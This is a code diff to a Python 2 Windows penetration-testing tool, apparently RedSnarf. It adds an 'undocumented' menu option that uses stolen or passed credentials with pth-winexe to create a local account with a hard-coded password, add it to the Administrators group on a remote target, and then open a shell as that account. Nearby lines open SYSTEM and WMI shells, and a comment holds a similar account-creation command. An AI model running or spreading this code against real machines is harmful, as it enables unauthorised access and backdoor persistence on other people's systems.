@@ -2520,14 +2520,24 @@ if dropshell in yesanswers:
 				sys.exit()
 			else:
 				#Check here whether we want a system shell or a shell in the context of the passed creds
+				#cmd.exe /c net user rottenadmin P@ssword123! /ADD && net localgroup Administrators rottenadmin /ADD
 				response = raw_input("Would you like a shell with SYSTEM Privileges?: Y/(N) ")
 				if response in yesanswers:	
 					print colored ('\n[+] Dropping a SYSTEM Shell on '+targets[0]+'\n','yellow')
 					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+targets[0]+" \"cmd.exe\" 2>/dev/null")
 					sys.exit()
+				#Undocumented option
 				elif response=="w":
 					print colored ('\n[+] Dropping WMI Based Shell on '+targets[0]+'\n','yellow')
 					os.system("wmiexec.py "+user+":"+passw+"@"+targets[0]+" 2>/dev/null")
+					sys.exit()
+				#Undocumented option
+				elif response=="a":
+					print colored ('\n[+] Dropping a SHELL based on New Account Details '+targets[0]+'\n','yellow')
+					print colored ("Adding a new account with the credentials username=redsnarf password=P@ssword1",'green')
+					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+targets[0]+" \"cmd.exe /c net user redsnarf P@ssword1 /ADD && net localgroup Administrators redsnarf /ADD\" 2>/dev/null")
+					print colored ("Dropping a shell with the account redsnarf and password P@ssword1",'green')
+					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+"redsnarf"+"%"+"P@ssword1"+"\" --uninstall \/\/"+targets[0]+" \"cmd.exe\" 2>/dev/null")
 					sys.exit()
 				else:
 					print colored ('\n[+] Dropping Shell on '+targets[0]+'\n','yellow')
